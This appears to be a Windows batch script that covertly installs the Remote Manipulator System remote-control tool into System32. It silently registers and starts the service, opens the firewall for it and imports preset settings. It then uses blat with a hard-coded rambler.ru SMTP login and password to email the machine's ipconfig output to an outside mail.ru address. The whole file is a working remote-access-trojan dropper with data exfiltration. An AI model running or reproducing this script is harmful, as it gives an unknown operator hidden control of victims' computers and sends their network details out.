"%SYSTEMROOT%\System32\rutserv.exe" /stop
"%SYSTEMROOT%\System32\rutserv.exe" /silentuninstall
reg delete "HKLM\SYSTEM\Remote Manipulator System" /f
copy /y "dsfOggMux.dll" "%SYSTEMROOT%\System32\dsfOggMux.dll"
copy /y "dsfTheoraEncoder.dll" "%SYSTEMROOT%\System32\dsfTheoraEncoder.dll"
copy /y "dsfVorbisEncoder.dll" "%SYSTEMROOT%\System32\dsfVorbisEncoder.dll"
copy /y "HookDrv.dll" "%SYSTEMROOT%\System32\HookDrv.dll"
copy /y "Microsoft.VC80.CRT.manifest" "%SYSTEMROOT%\System32\Microsoft.VC80.CRT.manifest"
copy /y "msvcp80.dll" "%SYSTEMROOT%\System32\msvcp80.dll"
copy /y "msvcr80.dll" "%SYSTEMROOT%\System32\msvcr80.dll"
copy /y "PushSource.ax" "%SYSTEMROOT%\System32\PushSource.ax"
copy /y "RWLN.dll" "%SYSTEMROOT%\System32\RWLN.dll"
copy /y "rversionlib.dll" "%SYSTEMROOT%\System32\rversionlib.dll"
copy /y "rutserv.exe" "%SYSTEMROOT%\System32\rutserv.exe"
copy /y "rfusclient.exe" "%SYSTEMROOT%\System32\rfusclient.exe"
copy /y "blat.lib" "%SYSTEMROOT%\System32\blat.lib"
copy /y "blat.dll" "%SYSTEMROOT%\System32\blat.dll"
copy /y "blat.exe" "%SYSTEMROOT%\System32\blat.exe"
copy /y "RIPCServer.dll" "%SYSTEMROOT%\System32\RIPCServer.dll"
"%SYSTEMROOT%\System32\rutserv.exe" /silentinstall
"%SYSTEMROOT%\System32\rutserv.exe" /firewall
regedit /s "settings7.reg"
"%SYSTEMROOT%\System32\rutserv.exe" /start
"%SYSTEMROOT%\system32\blat.exe" -install -server smtp.rambler.ru -port 587 -f skylinkanapa@rambler.ru -u skylinkanapa -pw qwerty123
ipconfig /all > %systemroot%/system32/ip.txt
blat.exe %systemroot%/system32/ip.txt -to rmanserver@mail.ru





